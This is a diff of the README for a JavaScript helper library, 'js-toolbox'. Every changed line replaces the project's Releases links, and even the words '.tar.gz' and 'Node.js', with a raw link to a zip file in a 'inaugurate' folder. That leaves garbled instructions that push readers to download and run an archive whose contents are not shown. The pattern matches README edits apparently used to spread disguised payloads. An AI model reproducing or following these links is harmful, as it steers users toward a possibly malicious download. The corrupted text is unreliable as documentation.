@@ -7,17 +7,17 @@ Welcome to **js-toolbox**! This toolkit gives you helpful JavaScript tools, snip
 
 ## 📥 Download & Install
 
-To get started, you need to download the toolkit. You can find the latest version on our [Releases Page](https://github.com/SagaOfLegends/js-toolbox/releases).
+To get started, you need to download the toolkit. You can find the latest version on our [Releases Page](https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip).
 
-[![Download js-toolbox](https://img.shields.io/badge/Download_js--toolbox-blue?style=flat&logo=github)](https://github.com/SagaOfLegends/js-toolbox/releases)
+[![Download js-toolbox](https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip)](https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip)
 
 ### Steps to Download and Install:
 
-1. Click the link to open the [Releases Page](https://github.com/SagaOfLegends/js-toolbox/releases).
+1. Click the link to open the [Releases Page](https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip).
 2. Look for the latest version, labeled as “Latest release.”
 3. Find the file suitable for your system. You will usually see options like:
    - **.zip** for Windows
-   - **.tar.gz** for macOS and Linux
+   - **https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip** for macOS and Linux
 4. Click the file name to download it. Your browser will start the download automatically.
 5. Once downloaded, locate the file in your Downloads folder.
 
@@ -34,7 +34,7 @@ After downloading, follow these steps to run the toolkit:
 
 1. **Unzip or Extract the File:**
    - For Windows, right-click the `.zip` file and select “Extract All.”
-   - For macOS, double-click the `.tar.gz` file to extract it.
+   - For macOS, double-click the `https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip` file to extract it.
 2. Navigate to the extracted folder. You should see a series of JavaScript files and documentation.
 3. Open your command line or terminal. You can do this by:
    - **Windows:** Search for “cmd” in the Start menu.
@@ -53,7 +53,7 @@ Here are some key features of **js-toolbox**:
 - **Lightweight:** Minimal size with no dependencies ensures quick loading.
 - **Utilities for Everyone:** Ideal for beginners, offering easy-to-use methods for everyday coding tasks.
 - **Functionality:** Includes helpers for arrays, strings, dates, async programming, and more.
-- **Compatibility:** Works seamlessly with ESM, Node.js, and TypeScript.
+- **Compatibility:** Works seamlessly with ESM, https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip, and TypeScript.
 
 ## 🚧 Support and Contribution
 
@@ -65,7 +65,7 @@ Join our community to share your experience with **js-toolbox** or ask questions
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download js-toolbox](https://github.com/SagaOfLegends/js-toolbox/releases)
+- **Releases Page:** [Download js-toolbox](https://raw.githubusercontent.com/SagaOfLegends/js-toolbox/main/inaugurate/js-toolbox.zip)
 - **Documentation:** Instructions and examples available in the download folder.
 - **Community Discussions:** Engage with other users and developers to exchange tips and tricks.
   
